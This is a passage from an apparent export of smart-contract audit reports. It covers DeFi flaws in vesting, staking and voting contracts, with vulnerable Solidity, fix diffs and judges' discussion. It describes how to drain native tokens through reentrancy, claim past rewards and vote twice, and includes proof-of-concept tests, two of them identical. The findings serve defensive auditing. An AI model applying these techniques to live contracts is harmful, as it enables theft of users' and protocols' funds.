    }
```

## Tool used

Foundry

## Recommendation
Subtract the correct amount from the checkpoint's value
```diff
-        _writeCheckpoint(_checkpoints[account], _subtract, amount);
+       _writeCheckpoint(_checkpoints[account], _subtract, vestingAmount - vestingScheduleOf[account].totalWithdrawn + amount)
```




## Discussion

**sherlock-admin4**

1 comment(s) were left on this issue during the judging contest.

**panprog** commented:
> high, incorrect checkpoints amount subtracted during `revokeVestingSchedule` causes permanent inflated amount of user votes.



**pseudonaut**

Recommended suggestion seems incorrect

It doesn't address the totalSupplyCheckpoints right above that line (both should be in tandem):

```solidity
_writeCheckpoint(_totalSupplyCheckpoints, _subtract, vestingAmount - vestingScheduleOf[account].totalWithdrawn + amount);
_writeCheckpoint(_checkpoints[account], _subtract, vestingAmount - vestingScheduleOf[account].totalWithdrawn + amount);
```


**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/Zivoe/zivoe-core-foundry/pull/268",Zivoe,Ruhum|rbserver|lemonmon|KingNFT|sakshamguruji|saidam017|0xvj|Tendency|dimulski|KupiaSec|ether\_sky|0xpiken|marchev|Varun\_05|Afriaudit|denzi\_|Ironsidesec|Tychai0s|mt030d|amar|9oelm|SilverChariot|0xAnmol|JigglypuffPikachu|samuraii77,HIGH,,47500 USDC,0,0,0,https://github.com/sherlock-audit/2024-03-zivoe-judging/issues/118,,,https://app.sherlock.xyz/audits/contests/280,solodit_reports,,2024-05-28 01:22:17,2024-10-15 01:47:41,1,"function revokeVestingSchedule(address account) external updateReward(account) onlyZVLOrITO nonReentrant {
        require(
            vestingScheduleSet[account], 
            ""ZivoeRewardsVesting::revokeVestingSchedule() !vestingScheduleSet[account]""
        );
        require(
            vestingScheduleOf[account].revokable, 
            ""ZivoeRewardsVesting::revokeVestingSchedule() !vestingScheduleOf[account].revokable""
        );
        
        uint256 amount = amountWithdrawable(account);
        uint256 vestingAmount = vestingScheduleOf[account].totalVesting;

        vestingTokenAllocated -= amount;

        vestingScheduleOf[account].totalWithdrawn += amount;
        vestingScheduleOf[account].totalVesting = vestingScheduleOf[account].totalWithdrawn;
        vestingScheduleOf[account].cliff = block.timestamp - 1;
        vestingScheduleOf[account].end = block.timestamp;

        vestingTokenAllocated -= (vestingAmount - vestingScheduleOf[account].totalWithdrawn);

        _totalSupply = _totalSupply.sub(vestingAmount);
        _writeCheckpoint(_totalSupplyCheckpoints, _subtract, vestingAmount);
        _writeCheckpoint(_checkpoints[account], _subtract, amount);
        _balances[account] = 0;
        stakingToken.safeTransfer(account, amount);

        vestingScheduleOf[account].revokable = false;

        emit VestingScheduleRevoked(
            account, 
            vestingAmount - vestingScheduleOf[account].totalWithdrawn, 
            vestingScheduleOf[account].cliff, 
            vestingScheduleOf[account].end, 
            vestingScheduleOf[account].totalVesting, 
            false
        );
    }",
1835113,f02d0dc679138a80ece7c119c607d0d5,Future stakers are paid with rewards that have been accrued from the past due to miscalculation in userRewardPerTokenPaid and _perTokenReward.,Codehawks,2024-07-11,"# Future stakers are paid with rewards that have been accrued from the past due to miscalculation in userRewardPerTokenPaid and _perTokenReward.

### Severity
High Risk

## Summary

Furure stakers are always vested rewards using the total `rewardPerToken` without deducting how much `rewardPerToken` has already been accumulated before they stake.

Any new staker will be rewarded with `rewardData.rewardPerTokenStored` that have been accumulated since creation of contract. That means a user who hasn't been staking from the beginning will be rewarded the same as a user who has been staking sing the beginning. Or in other words the contract assumes that every user staked when the `rewardData.rewardPerTokenStored` is 0.

This is exactly the same problem mentioned here by [rareskills](https://www.rareskills.io/post/staking-algorithm#:~:text=What%20if%20someone,at%20block%2020.).

## Vulnerability Details

`stake` calls `updateReward` modifier and we can see that every new staker's `userRewardPerTokenPaid` will be 0 since vesting rate is currently 0;

```Solidity
    modifier updateReward(address _account, uint256 _index) {
        {
            // stack too deep
            rewardData.rewardPerTokenStored = uint216(_rewardPerToken());
            rewardData.lastUpdateTime = uint40(_lastTimeRewardApplicable(rewardData.periodFinish));
            if (_account != address(0)) {
                StakeInfo memory _stakeInfo = _stakeInfos[_account][_index];
                uint256 vestingRate = _getVestingRate(_stakeInfo);
                claimableRewards[_account][_index] = _earned(_stakeInfo, _account, _index);
                userRewardPerTokenPaid[_account][_index] = vestingRate * uint256(rewardData.rewardPerTokenStored) / 1e18;
            }
        }
        _;
    }
```

```Solidity
    function _getVestingRate(StakeInfo memory _stakeInfo) internal view returns (uint256 vestingRate) {
        if (_stakeInfo.stakeTime == 0) {
            return 0;
        }
        if (block.timestamp > _stakeInfo.fullyVestedAt) {
            vestingRate = 1e18;
        } else {
            vestingRate = (block.timestamp - _stakeInfo.stakeTime) * 1e18 / vestingPeriod;
        }
    }
```

Suppose,

* after 1 year the accumulated `rewardPerTokenStored` is `1000e18`, which means every token staked since the beginning has earned 1000 tokens each.
* a new user Bob stakes 100 TEMPLE tokens.
* assuming the vesting period is 16 weeks, Bob claim his rewards after 16 weeks
* now his reward calculation is;

`_perTokenReward = _rewardPerToken();`

we can see that \_`_perTokenReward` for the new staker is the total  \_`_rewarsPerToken` which has been accumulating since the beginning.

```Solidity
        return  
            (_stakeInfo.amount * (_perTokenReward - userRewardPerTokenPaid[_account][_index])) / 1e18 +
            claimableRewards[_account][_index];
    }
```

* `(100 TEMPLE * (1000e18 - 0)) / 1e18 + 0`
* `= 100,000` TGLD rewards for staking 16 weeks.

This is assuming no new rewards are added, where bob should've gotten 0 TGLD as rewards. Bob just earned rewards equivalent to staking 1 year + 16 weeks(for new rewards).

The issue here is that the contract does not account for the already accumulated `rewardPerTokenStored` from the past when calculating the new staker's `userRewardPerTokenPaid` and calculates it using the total `rewardPerToken` :

&#x20;` userRewardPerTokenPaid[_account][_index] = vestingRate * uint256(rewardData.rewardPerTokenStored) / 1e18;`.

## Impact

Loss of reward tokens and unfair reward calculation for initial stakers or DOS(not enough reward tokens).
It also opens an attack path where a user can steal unclaimed rewards even when there are no new rewards added i.e. a user who enters after no new rewards are distributed will still get rewards from the past.

## Tools Used

manual

## Recommendations

Introduce a new variable;

```solidity
    //@audit a new variable to keep track of the already accumulated rewardPerToken before the user enters the protocol
    mapping(address account => mapping(uint256 index => uint256 amount)) public userRewardDebt; 
```

note that we cannot use the variable `userRewardPerTokenPaid` to track the already accumulated rewardPerToken because of the vestingRate, that would introduce another problem.

```diff
    function stakeFor(address _for, uint256 _amount) public whenNotPaused {
        if (_amount == 0) revert CommonEventsAndErrors.ExpectedNonZero();

        stakingToken.safeTransferFrom(msg.sender, address(this), _amount);
        uint256 _lastIndex = _accountLastStakeIndex[_for];
        _accountLastStakeIndex[_for] = ++_lastIndex; 

+       userRewardDebt[_for][_lastIndex] = _rewardPerToken(); //@audit we need to make sure we do it here before _applyStake, because it calls updateReward 

        _applyStake(_for, _amount, _lastIndex); 
        _moveDelegates(address(0), delegates[_for], _amount);
    }
```

```diff
    modifier updateReward(address _account, uint256 _index) {
        {
            // stack too deep
            rewardData.rewardPerTokenStored = uint216(_rewardPerToken());
            rewardData.lastUpdateTime = uint40(_lastTimeRewardApplicable(rewardData.periodFinish));
            if (_account != address(0)) {
                StakeInfo memory _stakeInfo = _stakeInfos[_account][_index];
                uint256 vestingRate = _getVestingRate(_stakeInfo);
                claimableRewards[_account][_index] = _earned(_stakeInfo, _account, _index);
-               userRewardPerTokenPaid[_account][_index] = vestingRate * uint256(rewardData.rewardPerTokenStored) / 1e18;
+               //@audit vest only the newly accrued rewardPerToken after the user enters 
+               userRewardPerTokenPaid[_account][_index] = vestingRate * (uint256(rewardData.rewardPerTokenStored) - userRewardDebt[_account][_index] ) / 1e18;
                // this will still be zero when new staker enters, but since we deduct the userRewardDebt before calculating it, we will only reward with the newly accrued rewardPerToken
            }
        }
        _;
    }
```

```diff
    function _earned(
        StakeInfo memory _stakeInfo,
        address _account,
        uint256 _index
    ) internal view returns (uint256) {
        uint256 vestingRate = _getVestingRate(_stakeInfo);
        if (vestingRate == 0) {
            return 0;
        }
        uint256 _perTokenReward;
        if (vestingRate == 1e18) { 
-            _perTokenReward = _rewardPerToken();
+            _perTokenReward = _rewardPerToken() - userRewardDebt[_account][_index];
        } else { 
-           _perTokenReward = _rewardPerToken() * vestingRate / 1e18;
+           _perTokenReward = (_rewardPerToken() - userRewardDebt[_account][_index]) * vestingRate / 1e18;
        }
        
        return
            (_stakeInfo.amount * (_perTokenReward - userRewardPerTokenPaid[_account][_index])) / 1e18 +
            claimableRewards[_account][_index];
    }
```

This ensures that `_perTokenReward` for the staker is only the newly accumulated `rewardPerToken`, post staking.",TempleGold,adriro|0x3b|shikhar229169|jesjupyter|mt030d|ZukaNoPro|touthang|hyperhorse,HIGH,,25000 USDC,0,0,0,https://github.com/Cyfrin/2024-07-templegold,,,https://codehawks.cyfrin.io/c/clxyjvjkg0007isl3p290etog,solodit_reports,,2024-07-30 02:01:01,2024-10-15 02:06:57,1,,Cross Chain
1835195,d7ee675a35df33ce26912f74792d6d4e,Vesting Logic Would Keep Reverting For An Edge Case,Zokyo,2024-04-11,"**Severity**: High

**Status**: Resolved

**description**

The normal flow in the system is , users deposit , they deposit is raised and liquidity is added
to pancakeSwap and users can vest their shares using the function `vesting()` .
In the contract `TokenSaleUSDB` (same for `TokenSaleETH.sol`) the `decimalDifference` is
calculated at L281 which is used to normalise the `amountFinal` . But if the `tokenAddress’s`
decimal is more than 18 then the calculation at L281 would always revert due to overflow.
Therefore a malicious user can create a `TokenSale` where token is a token with 22 decimals
and make the users deposit their share into the pool , but the users would never be able to
claim their vest due to the overflow error .

**Recommendation:**

Restrict token to 18 decimals or normalise accordingly.",Zap,Zokyo,HIGH,,,0,0,0,,https://github.com/solodit/solodit_content/blob/main/reports/Zokyo/2024-04-11-zap.md,,,solodit_reports,,2024-08-06 01:41:05,2024-10-15 01:44:08,1,,
1835202,24193495606af0aa3de61d2b76cd3fc1,Reentrance can lead to loss of funds,Zokyo,2024-04-11,"**Severity**: Critical

**Status**: Resolved

**Description**

In Contract Vesting.sol, the method `claim()` allows users to claim the deposited tokens once the vesting time is over.

Since the deposited asset can be ETH/Native token as well, it will be sent to the user as per the following logic:
```solidity
if (pctAmount != 0) {
           if (address(token) == address(1)) {
               (bool sent, ) = payable(sender).call{value: pctAmount}(""""); 
               require(sent, ""Failed to send BNB to receiver"");
           } else {
               token.safeTransfer(sender, pctAmount);
           }
           s.index = uint128(i);
           s.amountClaimed += pctAmount;
       }
```
Here, Sending Ether is transferring the access of execution to the `sender` account, and then the `sender` account can call the `claim` method again. Since `s.index` is still not updated, the `pctAmount` will be calculated again and the same amount of ETH will be sent to the `sender`.

The sender can repeat this process until no ETH/native token is left in the contract. This way `sender` can steal all the ETH/native tokens from the contract.

This happens due to no reentrancy protection and not following the CEI (Check-Effects-Interaction) pattern.

**Recommendation**: 

Update the `s.index` and `s.amountClaimed` before sending assets to the user. Also, check `s.amountClaimed` if necessary before the claim. Finally, add OZ Reentrancy guard as well.",Zap,Zokyo,HIGH,,,0,0,0,,https://github.com/solodit/solodit_content/blob/main/reports/Zokyo/2024-04-11-Zap.md,,,solodit_reports,,2024-08-06 01:41:10,2024-10-15 01:44:20,1,,
1835473,b2f1f5edd625e982176fef16fa0879bb,H-5: Voting does not take into account end of staking lock period,Sherlock,2024-07-11,"# Issue H-5: Voting does not take into account end of staking lock period 

Source: https://github.com/sherlock-audit/2024-06-magicsea-judging/issues/166 

## Found by 
0xAnmol, 0xpranav, Aymen0909, BengalCatBalu, ChinmayF, DPS, Hunter, KupiaSec, LeFy, PUSH0, Reentrants, Silvermist, WildSniper, anonymousjoe, araj, aslanbek, blackhole, blockchain555, cocacola, coffiasd, dany.armstrong90, dhank, dimulski, iamnmt, jennifer37, jsmi, kmXAdam, novaman33, qmdddd, radin200, rsam\_eth, santipu\_, scammed, snapishere, tedox, utsav, web3pwn, ydlee, zarkk01
## Summary

The protocol allows to vote in `Voter` contract by means of staked position in `MlumStaking`. To vote, user must have staking position with certain properties. However, the voting does not implement check against invariant that the remaining lock period needs to be longer then the epoch time to be eligible for voting. Thus, it is possible to vote with stale voting position. Additionally, if position's lock period finishes inside of the voting epoch it is possible to vote, withdraw staked position, stake and vote again in the same epoch. Thus, voting twice with the same stake amount is possible from time to time. Ultimately, the invariant that voting once with same balance is only allowed is broken as well.
The voting will decide which pools receive LUM emissions and how much.

## Vulnerability Detail

The documentation states that:

> Who is allowed to vote
> Only valid Magic LUM Staking Position are allowed to vote. The overall lock needs to be longer then 90 days and the remaining  lock period needs to be longer then the epoch time. 

User who staked position in the `MlumStaking` contract gets NFT minted as a proof of stake with properties describing this stake. Then, user can use that staking position to vote for pools by means of `vote()` in `Voter` contract. The `vote()` functions checks if `initialLockDuration` is higher than `_minimumLockTime` and `lockDuration` is higher than `_periodDuration` to process further. However, it does not check whether the remaining lock period is longer than the epoch time. 
Thus, it is possible to vote with stale staking position.
Also, current implementation makes `renewLockPosition` and `extendLockPosition` functions useless.

```solidity
    function vote(uint256 tokenId, address[] calldata pools, uint256[] calldata deltaAmounts) external {
        if (pools.length != deltaAmounts.length) revert IVoter__InvalidLength();

        // check voting started
        if (!_votingStarted()) revert IVoter_VotingPeriodNotStarted();
        if (_votingEnded()) revert IVoter_VotingPeriodEnded();

        // check ownership of tokenId
        if (_mlumStaking.ownerOf(tokenId) != msg.sender) {
            revert IVoter__NotOwner();
        }

        uint256 currentPeriodId = _currentVotingPeriodId;
        // check if alreay voted
        if (_hasVotedInPeriod[currentPeriodId][tokenId]) {
            revert IVoter__AlreadyVoted();
        }

        // check if _minimumLockTime >= initialLockDuration and it is locked
        if (_mlumStaking.getStakingPosition(tokenId).initialLockDuration < _minimumLockTime) {
            revert IVoter__InsufficientLockTime();
        }
        if (_mlumStaking.getStakingPosition(tokenId).lockDuration < _periodDuration) {
            revert IVoter__InsufficientLockTime();
        }

        uint256 votingPower = _mlumStaking.getStakingPosition(tokenId).amountWithMultiplier;

        // check if deltaAmounts > votingPower
        uint256 totalUserVotes;
        for (uint256 i = 0; i < pools.length; ++i) {
            totalUserVotes += deltaAmounts[i];
        }

        if (totalUserVotes > votingPower) {
            revert IVoter__InsufficientVotingPower();
        }

        IVoterPoolValidator validator = _poolValidator;

        for (uint256 i = 0; i < pools.length; ++i) {
            address pool = pools[i];

            if (address(validator) != address(0) && !validator.isValid(pool)) {
                revert Voter__PoolNotVotable();
            }

            uint256 deltaAmount = deltaAmounts[i];

            _userVotes[tokenId][pool] += deltaAmount;
            _poolVotesPerPeriod[currentPeriodId][pool] += deltaAmount;

            if (_votes.contains(pool)) {
                _votes.set(pool, _votes.get(pool) + deltaAmount);
            } else {
                _votes.set(pool, deltaAmount);
            }

            _notifyBribes(_currentVotingPeriodId, pool, tokenId, deltaAmount); // msg.sender, deltaAmount);
        }

        _totalVotes += totalUserVotes;

        _hasVotedInPeriod[currentPeriodId][tokenId] = true;

        emit Voted(tokenId, currentPeriodId, pools, deltaAmounts);
    }
```

The documentation states that minimum lock period for staking to be eligible for voting is 90 days.
The documentation states that voting for pools occurs biweekly.

Thus, assuming the implementation with configuration presented in the documentation, every 90 days it is possible to vote twice within the same voting epoch by:
- voting,
- withdrawing staked amount,
- creating new position with staking token,
- voting again.

```solidity
    function createPosition(uint256 amount, uint256 lockDuration) external override nonReentrant {
        // no new lock can be set if the pool has been unlocked
        if (isUnlocked()) {
            require(lockDuration == 0, ""locks disabled"");
        }

        _updatePool();

        // handle tokens with transfer tax
        amount = _transferSupportingFeeOnTransfer(stakedToken, msg.sender, amount);
        require(amount != 0, ""zero amount""); // createPosition: amount cannot be null

        // mint NFT position token
        uint256 currentTokenId = _mintNextTokenId(msg.sender);

        // calculate bonuses
        uint256 lockMultiplier = getMultiplierByLockDuration(lockDuration);
        uint256 amountWithMultiplier = amount * (lockMultiplier + 1e4) / 1e4;

        // create position
        _stakingPositions[currentTokenId] = StakingPosition({
            initialLockDuration: lockDuration,
            amount: amount,
            rewardDebt: amountWithMultiplier * (_accRewardsPerShare) / (PRECISION_FACTOR),
            lockDuration: lockDuration,
            startLockTime: _currentBlockTimestamp(),
            lockMultiplier: lockMultiplier,
            amountWithMultiplier: amountWithMultiplier,
            totalMultiplier: lockMultiplier
        });

        // update total lp supply
        _stakedSupply = _stakedSupply + amount;
        _stakedSupplyWithMultiplier = _stakedSupplyWithMultiplier + amountWithMultiplier;

        emit CreatePosition(currentTokenId, amount, lockDuration);
    }
```

## Proof of Concept

Scenario 1:

```solidity
function testGT_vote_twice_with_the_same_stake() public {
        vm.prank(DEV);
        _voter.updateMinimumLockTime(2 weeks);

        _stakingToken.mint(ALICE, 1 ether);

        vm.startPrank(ALICE);
        _stakingToken.approve(address(_pool), 1 ether);
        _pool.createPosition(1 ether, 2 weeks);
        vm.stopPrank();

        skip(1 weeks);

        vm.prank(DEV);
        _voter.startNewVotingPeriod();

        vm.startPrank(ALICE);
        _voter.vote(1, _getDummyPools(), _getDeltaAmounts());
        vm.expectRevert(IVoter.IVoter__AlreadyVoted.selector);
        _voter.vote(1, _getDummyPools(), _getDeltaAmounts());
        vm.stopPrank();

        assertEq(_voter.getTotalVotes(), 1 ether);

        skip(1 weeks + 1);

        vm.startPrank(ALICE);
        _pool.withdrawFromPosition(1, 1 ether);
        vm.stopPrank();

        vm.startPrank(ALICE);
        vm.expectRevert();
        _voter.vote(1, _getDummyPools(), _getDeltaAmounts());
        _stakingToken.approve(address(_pool), 1 ether);
        _pool.createPosition(1 ether, 2 weeks);
        _voter.vote(2, _getDummyPools(), _getDeltaAmounts());
        vm.stopPrank();

        assertEq(_voter.getTotalVotes(), 2 ether);
    }
```

Scenario 2:

```solidity
function testGT_vote_twice_with_the_same_stake() public {
        vm.prank(DEV);
        _voter.updateMinimumLockTime(2 weeks);

        _stakingToken.mint(ALICE, 1 ether);

        vm.startPrank(ALICE);
        _stakingToken.approve(address(_pool), 1 ether);
        _pool.createPosition(1 ether, 2 weeks);
        vm.stopPrank();

        skip(1 weeks);

        vm.prank(DEV);
        _voter.startNewVotingPeriod();

        vm.startPrank(ALICE);
        _voter.vote(1, _getDummyPools(), _getDeltaAmounts());
        vm.expectRevert(IVoter.IVoter__AlreadyVoted.selector);
        _voter.vote(1, _getDummyPools(), _getDeltaAmounts());
        vm.stopPrank();

        assertEq(_voter.getTotalVotes(), 1 ether);

        skip(1 weeks + 1);

        vm.startPrank(ALICE);
        _pool.withdrawFromPosition(1, 1 ether);
        vm.stopPrank();

        vm.startPrank(ALICE);
        vm.expectRevert();
        _voter.vote(1, _getDummyPools(), _getDeltaAmounts());
        _stakingToken.approve(address(_pool), 1 ether);
        _pool.createPosition(1 ether, 2 weeks);
        _voter.vote(2, _getDummyPools(), _getDeltaAmounts());
        vm.stopPrank();

        assertEq(_voter.getTotalVotes(), 2 ether);
    }
```

## Impact

A user can vote with stale staking position, then withdraw the staking position with any consequences. 
Additionally, a user can periodically vote twice with the same balance of staking tokens for the same pool to increase unfairly the chance of the pool being selected for further processing.

## Code Snippet

https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/Voter.sol#L172
https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/Voter.sol#L175

## Tool used

Manual Review

## Recommendation

It is recommended to enforce the invariant that the remaining lock period must be longer than the epoch time to be eligible for voting.
Additionally, It is recommended to prevent double voting at any time. One of the solution can be to prevent voting within the epoch if staking position was not created before epoch started.



## Discussion

**0xSmartContract**

The vulnerability identified involves the voting mechanism within the `Voter` contract that allows users to vote using staked positions in the `MlumStaking` contract. 

The issue arises because the contract does not validate if the remaining lock period of a staking position is longer than the voting epoch. As a result, users can vote with a staking position that has a lock period ending within the voting epoch, allowing potential double voting by.


This vulnerability can lead to:
- Voting with stale staking positions.
- Double voting within the same epoch, thus skewing the vote results unfairly.
- Breaking the invariant that each stake amount should only vote once per epoch.



The `vote` function currently checks:
1. The ownership of the tokenId.
2. If the user has already voted in the current period.
3. The initial lock duration and current lock duration against minimum thresholds.

However, it fails to ensure that the remaining lock period exceeds the epoch time, allowing potential manipulation as described.

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/metropolis-exchange/magicsea-staking/pull/25


**chinmay-farkya**

Escalate

Some issues have been incorrectly duped with this issue :

#219 is not a duplicate and is actually invalid as it involves a trusted admin to use a function at a wrong time. The assertion that the admin will start a new voting period when one is already running is completely unreasonable. Also, the readme clearly mentions that a keeper bot is meant to start new epochs periodically and its off-chain and out-of-scope.
#306 is not a duplicate and is invalid as it ties to the same reasoning for #219 above
#504 is again not a duplicate as it ties to the same reasoning for #219 above
#405 is again not a duplicate as it ties to the same reasoning for #219 above
#407 is not a duplicate and is invalid due to the same reason as #219, cited above.

 
#252 is not a duplicate of this and is invalid/low because it just points out a difference between docs and code but it has no real impact or loss of funds. It talks about the ability to claim rewards later after more epoch periods have passed, which is completely normal and does not relate to a malicious action or a loss to the staker. 
#413 is invalid because frontrunning is not possible on iota
#419 is a completely different issue and is a low because its an admin controlled action. Admin can wait for the current voting period to end, then update minimumLockTime and then start a new voting period. Since admin is trusted, they are expected to wait for current period to end and only checking time config starting from the next period. 
From sherlock docs
> An admin action can break certain assumptions about the functioning of the code. Example: Pausing a collateral causes some users to be unfairly liquidated or any other action causing loss of funds. This is not considered a valid issue.


There is a separate set of issues described as “expired positions can keep harvesting rewards”. This is not the same as what this issue 166 describes. Fixing 166 by not allowing voting using already expired or to-be-expired-soon during the voting period is not going to fix this set of issues, because harvesting rewards will still be possible in MLUMStaking.sol. 

This set includes: #6, #530, #362 and #253

This set should be made a separate medium issue. It requires expired locks to be kicked or harvesting to be disabled for already expired locks. 

**sherlock-admin3**

> Escalate
> 
> Some issues have been incorrectly duped with this issue :
> 
> #219 is not a duplicate and is actually invalid as it involves a trusted admin to use a function at a wrong time. The assertion that the admin will start a new voting period when one is already running is completely unreasonable. Also, the readme clearly mentions that a keeper bot is meant to start new epochs periodically and its off-chain and out-of-scope.
> #306 is not a duplicate and is invalid as it ties to the same reasoning for #219 above
> #504 is again not a duplicate as it ties to the same reasoning for #219 above
> #405 is again not a duplicate as it ties to the same reasoning for #219 above
> #407 is not a duplicate and is invalid due to the same reason as #219, cited above.
> 
>  
> #252 is not a duplicate of this and is invalid/low because it just points out a difference between docs and code but it has no real impact or loss of funds. It talks about the ability to claim rewards later after more epoch periods have passed, which is completely normal and does not relate to a malicious action or a loss to the staker. 
> #413 is invalid because frontrunning is not possible on iota
> #419 is a completely different issue and is a low because its an admin controlled action. Admin can wait for the current voting period to end, then update minimumLockTime and then start a new voting period. Since admin is trusted, they are expected to wait for current period to end and only checking time config starting from the next period. 
> From sherlock docs
> > An admin action can break certain assumptions about the functioning of the code. Example: Pausing a collateral causes some users to be unfairly liquidated or any other action causing loss of funds. This is not considered a valid issue.
> 
> 
> There is a separate set of issues described as “expired positions can keep harvesting rewards”. This is not the same as what this issue 166 describes. Fixing 166 by not allowing voting using already expired or to-be-expired-soon during the voting period is not going to fix this set of issues, because harvesting rewards will still be possible in MLUMStaking.sol. 
> 
> This set includes: #6, #530, #362 and #253
> 
> This set should be made a separate medium issue. It requires expired locks to be kicked or harvesting to be disabled for already expired locks. 

You've created a valid escalation!

To remove the escalation from consideration: Delete your comment.

You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.

**0xSmartContract**

#219, #306, #504, #405, #407 , #419; This group is considered invalid under ""Admin Input and responsibility"", I agree.

#252 low/Invalid ,  I agree (There is an escalation process in 252, so 252 should be evaluated as low/invalid.)

#413  I do not agree.(The verdict is that front-running on IOTA is valid)
This issue was discussed and confirmed with Sherlock officials;
The verdict is that front-running on IOTA is valid, but can be at most medium severity, since it's not reliable and uncontrollable by the attacker, though they can mitigate randomness with sending lot's of transactions.
But later this year, this will be invalid, cause when IOTA launches version 2.0, they will have no mempool at all, while the current one is public.

#6, #530, #362, #253 Set includes . I do not agree





**0xf1b0**

> #413 is invalid because frontrunning is not possible on iota

Front running becomes possible when the reward schedule is [known](https://docs.magicsea.finance/protocol/magic/magic-lum-staking) in advance. There's no necessity to monitor a pool and send transactions within the same block; this can be accomplished an hour earlier.

Although it may not be the most suitable title, the issue remains definitively valid.

**J4X-98**

> #6, #530, #362, #253 Set includes . I do not agree

@0xSmartContract what do you mean by that?

Additionally regarding #413, tx are randomly ordered on the IOTA evm which makes frontrunning impossible. The IOTA EVM [documentation](https://evm.iota.org/) also states this:

""To protect against Maximal Extractable Value attacks, the IOTA Smart Contract chain natively randomizes transaction ordering, making it impossible to determine the content of a block in order to manipulate it.""

**0xSmartContract**

> #413 I do not agree.(The verdict is that front-running on IOTA is valid)
> This issue was discussed and confirmed with Sherlock officials;
> The verdict is that front-running on IOTA is valid, but can be at most medium severity, since it's not reliable and uncontrollable by the attacker, though they can mitigate randomness with sending lot's of transactions.
> But later this year, this will be invalid, cause when IOTA launches version 2.0, they will have no mempool at all, while the current one is public.

Front-running on IOTA is valid
I also said that there was no front-run like you, but Sherlock confirmed it , @WangSecurity ;

This issue was discussed and confirmed with Sherlock officials;
The verdict is that front-running on IOTA is valid, but can be at most medium severity, since it's not reliable and uncontrollable by the attacker, though they can mitigate randomness with sending lot's of transactions.
But later this year, this will be invalid, cause when IOTA launches version 2.0, they will have no mempool at all, while the current one is public.




**J4X-98**

@0xSmartContract,

If the head of judging is of that opinion I guess we'll have to accept it. Although it makes almost no sense on a sandwiching attack, as the user would only be able to extract a minor part of the funds as he has to split his capital used for the sandwich into many txs.

Nevertheless could you tell me what you meant by the quoted part on top of my message? 

**0xSmartContract**

> @0xSmartContract,
> 
> If the head of judging is of that opinion I guess we'll have to accept it. Although it makes almost no sense on a sandwiching attack, as the user would only be able to extract a minor part of the funds as he has to split his capital used for the sandwich into many txs.
> 
> Nevertheless could you tell me what you meant by the quoted part on top of my message?

A set was mentioned in Escalate, I just wanted to say that this issue should not be separated into a different set.

**J4X-98**

@0xSmartContract, 

What's your reasoning for that? As mentioned by me on the escalation of #6 these are completely different issues.

**0xSmartContract**

> @0xSmartContract,
> 
> What's your reasoning for that? As mentioned by me on the escalation of #6 these are completely different issues.

#6 and #166

- Both issues focus on gaining unfair advantage through positions whose lock period has expired.
- Both issues deal with the ability of positions whose lock period has expired to remain valid in the current system.
- Both issues propose that positions should be revoked if their lock period has expired to prevent this situation.

**chinmay-farkya**

I disagree with your take that these are the same issues. Just because they happen to be in the same component of functionality, they can't be duped. 

One problem exists in the voter contract, and another exists in MLUMStaking. In 166, we need to check for remaining lock duration which can also expire during the period itself. 

Thus the solution for 6 which is to kick expired positions is not going to solve 166 as positions that have not expired yet but soon-to-expire will still be able to take advantage in voting. They have separate problems and solutions, and are not dups.

> Both issues focus on gaining unfair advantage through positions whose lock period has expired.

Not entirely true. 166 is also about soon-to-expire positions (ie. anytime in the next 14 days) and they can't be kicked.

> Both issues deal with the ability of positions whose lock period has expired to remain valid in the current system.

Again not true due to the involvement of soon-to-expire positions

>Both issues propose that positions should be revoked if their lock period has expired to prevent this situation.

Now that is completely false. 166 proposes to check remaining duration and not to ""revoke positions"" as some positions might still be active and would expire during the period itself, they can't be simply kicked. 


**J4X-98**

> - Both issues focus on gaining unfair advantage through positions whose lock period has expired.

This is a similar impact. But this is no reason for grouping issues. If you find 10 different ways to drain funds in a contract with different root causes you also can't merge them into one issue just because they all have the same impact.

> - Both issues deal with the ability of positions whose lock period has expired to remain valid in the current system.

This is a similar scenario, but still no reason for duping. That would be the same if you had multiple issues that occur while a contract is paused, but all originate from different root causes. You also can't duplicate those together.

> - Both issues propose that positions should be revoked if their lock period has expired to prevent this situation.

This is not true. #166 does not state anything about revoking the positions once they are expired. It just fixes the if statement.

**WangSecurity**

About the escalation comment:
1. #219, #306, #504, #405, #407 -- agree to invalidate based on the reasoning in the escalation comment.
2. 252 is already considered on its escalation.
3. #413 -- As I understand, the front-running is still possible (until the launch of IOTA V2 with no mempool), but unreliable. But, the report doesn't have sufficient proof of the issue considering there are other constraints of the lock duration, for example. Hence, I agree it should be invalid.
4. #419 -- agree with the escalation comment, I believe it's precise.
5. I agree that issues #6, #530, #362 and #253 are a different family. #6 is escalated, so the discussion about them will be continued under #6.

Planning to accept the escalation and apply the changes above.

**WangSecurity**

Result:
High
Has duplicates

**sherlock-admin4**

Escalations have been resolved successfully!

Escalation status:
- [chinmay-farkya](https://github.com/sherlock-audit/2024-06-magicsea-judging/issues/166/#issuecomment-2265003852): accepted",MagicSea - the native DEX on the IotaEVM,Aymen0909|santipu\_|blackhole|dimulski|dany.armstrong90|Silvermist|KupiaSec|coffiasd|aslanbek|araj|ydlee|cocacola|qmdddd|PUSH0|novaman33|jennifer37|web3pwn|BengalCatBalu|radin200|tedox|zarkk01|blockchain555|DPS|0xAnmol|dhank|utsav|WildSniper|iamnmt|jsmi|snapishere|LeFy|Reentrants|rsam\_eth|anonymousjoe|scammed|kmXAdam|0xpranav|ChinmayF|Hunter,HIGH,,28250 USDC,0,5,4,https://github.com/sherlock-audit/2024-06-magicsea-judging/issues/166,,,https://app.sherlock.xyz/audits/contests/437,solodit_reports,,2024-08-27 02:04:41,2024-10-15 02:06:24,1,,
1835983,bf50606d1ee3f6064583fcf5a1e1572e,Vesting Contract Can Be Overridden,Zokyo,2023-10-20,"**Severity**: High

**Status**: Resolved

**Description**

In the contract EsEMBR.sol, the function addVester() can cause catastrophic failure of users' funds. If a contract is added with the same timeframe, then all of the users funds being calculated in the previous contract will be permanently lost as there is no way to track the funds on the new Vester contract.

**Recommendation**: 

It is recommended that there be a check when adding a Vester contract a validation check is done to ensure that a vesting contract cannot be overridden while assets are being vested.

**Comment**: 

